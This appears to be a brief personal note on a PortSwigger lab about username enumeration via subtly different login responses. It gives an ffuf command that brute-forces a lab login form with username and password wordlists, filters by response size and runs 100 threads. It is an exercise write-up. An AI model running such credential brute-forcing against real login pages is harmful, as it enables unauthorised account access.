https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses
---
**Difficulty**: EASY
**CWE-lists**:
- [[CWE-307(improper-restriction-of-excesive-authz-attempts)]]
-------

Then use it for fuzzing, the number of threads, the number after the `-t` flag, may vary from your computer, internet, processor
```sh
ffuf -u https://0a3a00600450848882342a9d00da00e1.web-security-academy.net/login -X POST -d "username=W1&password=W2" -w username-list.txt:W1 -w password-list.txt:W2 -replay-proxy http://127.0.0.1:8080 -fl 65,66 -t 100 
	```

![[Pasted image 20241104234706.png]]
And it will appear